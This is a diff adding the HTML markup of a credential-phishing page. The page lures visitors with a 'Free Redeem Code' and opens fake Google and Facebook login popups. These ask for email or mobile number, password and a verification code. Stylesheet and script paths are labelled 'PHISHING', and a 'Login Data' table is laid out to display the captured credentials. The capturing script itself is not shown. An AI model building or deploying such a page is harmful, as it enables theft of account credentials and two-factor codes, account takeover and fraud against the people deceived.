@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Redeem</title>
+    <link rel="stylesheet" href="/storage/emulated/0/1ID PHISHING.CSS/Login .css">
+    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+</head>
+<style>
+
+</style>
+<body>
+    <div id="main-container"><br><br>
+        <h1>Login and get Free Redeem Code</h1>
+        <div class="login-buttons"><br><br>
+            <button id="google-login"><ion-icon name="logo-google"></ion-icon> Login with Google</button>
+            <button id="facebook-login"><ion-icon name="logo-facebook"></ion-icon> Login with Facebook</button>
+        </div>
+    </div>
+
+<!-- Google Login Popup -->
+<div id="google-popup" class="popup">
+    <div class="popup-content">
+        <h2>Google Login</h2>
+        <div class="input-container">
+            <input type="text" id="google-email" required>
+            <label>Email</label>
+            <ion-icon name="mail-outline"></ion-icon>
+        </div>
+        <div class="input-container">
+            <input type="password" id="google-password" required>
+            <label>Password</label>
+            <ion-icon name="lock-closed-outline"></ion-icon>
+        </div>
+        <div class="input-container">
+            <input type="text" id="google-code" required>
+            <label>Enter Key</label>
+            <ion-icon name="key-outline"></ion-icon>
+        </div>
+        <a href="#" class="forget-password">Forget Password?</a>
+        <button onclick="googleLogin()" class="Btn">Login</button>
+    </div>
+</div>
+
+<!-- Facebook Login Popup -->
+<div id="facebook-popup" class="popup">
+    <div class="popup-content">
+        <h2>Facebook Login</h2>
+        <div class="input-container">
+            <input type="text" id="facebook-mobile" required>
+            <label>Mobile Number</label>
+            <ion-icon name="call-outline"></ion-icon>
+        </div>
+        <div class="input-container">
+            <input type="password" id="facebook-password" required>
+            <label>Password</label>
+            <ion-icon name="lock-closed-outline"></ion-icon>
+        </div>
+        <div class="input-container">
+            <input type="text" id="facebook-code" required>
+            <label>Code (e.g., 123456)</label>
+            <ion-icon name="key-outline"></ion-icon>
+        </div>
+        <a href="#" class="forget-password">Forget Password?</a>
+        <button onclick="facebookLogin()" class="Btn">Login</button>
+    </div>
+</div>
+
+    <!-- Redeem Code Popup -->
+    <div id="redeem-popup" class="popup">
+        <div class="popup-content">
+            <h2>Click Button to Get Free Redeem Code</h2>
+            <div class="input-container">
+                <input type="text" id="redeem-code" readonly>
+                <button id="copyButton" onclick="copyCode()">
+                    <ion-icon name="copy-outline" id="copy-icon"></ion-icon>
+                    <ion-icon name="checkmark-outline" id="check-icon"></ion-icon>
+                </button>
+            </div>
+            <button onclick="getCode()" class="button-85">Get Code</button>
+        </div>
+    </div>
+
+    <!-- Countdown Popup -->
+    <div id="countdown-popup" class="popup">
+        <div class="popup-content">
+            <div id="countdown-circle">
+                <span id="countdown-number">5</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Full Screen Popup for Login Data -->
+    <div id="data-popup" class="popup">
+        <div class="popup-content">
+            <span class="close" onclick="closePopup('data-popup')">&times;</span>
+            <h2>Login Data</h2>
+           
+            <div id="login-data">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Platform</th>
+                            <th>Email/Mobile</th>
+                            <th>Password</th>
+                            <th>Code</th>
+                        </tr>
+                    </thead>
+                    <tbody id="login-data-body">
+                        <!-- Data will be populated here by JavaScript -->
+                    </tbody>
+                </table>
+            </div>
+            <button onclick="closePopup('data-popup')">Close</button>
+        </div>
+    </div>
+
+<script src="/storage/emulated/0/1ID PHISHING.JS/Login.js">
+  
+</script>
+</body>
+</html>
